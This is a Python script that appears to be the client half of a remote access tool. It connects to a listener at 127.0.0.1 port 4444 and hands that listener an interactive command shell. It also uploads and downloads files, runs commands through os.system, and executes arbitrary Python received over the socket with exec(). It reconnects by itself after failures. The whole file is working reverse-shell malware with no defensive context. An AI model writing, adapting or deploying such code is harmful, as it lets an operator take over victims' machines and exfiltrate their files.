import socket,pickle
import subprocess
import os
import sys
import time
import threading


task=threading

def create():
    global s
    try:
        s=socket.socket()
    except socket.error:
           time.sleep(3.0)
           main()
def connect():
    try:
            
        s.connect(("127.0.0.1",4444))
            
    except socket.error:
           print("conntion error")
           time.sleep(3.0)
           main()


def meter():
    try:
        x=s.recv(2048).decode()
        if x=='chat':
           chat()
        elif x=='shell':
             shell()
        elif x=='upload':
             download()
        elif x=='download':
             upload()
        elif x=='excute':
             excute()
        elif x=='exec1':
             exec1()
             meter()
        elif x=='quit':
             main()
        elif x=='exit':
             main()
        elif x=='shutdown':
             sys.exit()
        else:
            meter()

    except socket.error:
        main()
        
         
def chat():
    while True:
             try:

                 d=s.recv(2048).decode()

                 print(d)
                 if d=='meter':
                    meter()
                    break
                 elif d=='exit':
                      main()
                      break
                    
                 else:
                     d=input("chat from user>")
                     s.send(d.encode())
             except socket.error:
                    time.sleep(4.0)
                    main()
                 
def shell():
    while True:

              try:
       
                 data=s.recv(8080).decode()

                 if data=='meter':
                     meter()
                     break
                 elif data=='exit':
                      main()
                      break
                 else:
                     result =  subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE,universal_newlines=True)

                     result = result.stdout.read() + result.stderr.read()

                     s.send(result.encode())

              except socket.error:
                  time.sleep(4.0)
                  main()
def upload():
    try:
        d="dir"
        i=subprocess.Popen(d,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE,universal_newlines=True)
        i = i.stdout.read() + i.stderr.read()
        s.send(i.encode())

        filename=s.recv(2048).decode()
        with open(filename,'rb') as file:
            size=1024
            data=file.read(size)
            while data:
                s.send(data)
                data=file.read(size)
        print("sucess fully sent")
        meter()
    except socket.error:
        time.sleep(4.0)
        main()
    
    
def download():
    try:
        
       filename=s.recv(2048).decode()
    
       with open(filename,'wb') as file:
           while True:
               data=s.recv(2048)
               print(len(data))
               if not data:
                   break
               else:
                   file.write(data)
                
       file.close()
       meter()
    except socket.error:
        print('socket error')
        main()

def excute():
    try:
        e=s.recv(2048).decode()
        if e=='meter':
            meter()
        elif e=='exit':
            main()
        else:
            os.system(e)
            meter()
    except socket.error:
               main()


def exec1():
    da=s.recv(2048).decode()
    
    exec(da)
    
    meter()
    



def main():
    time.sleep(3.0)
    create()
    connect()
    meter()
    
    

    
main()
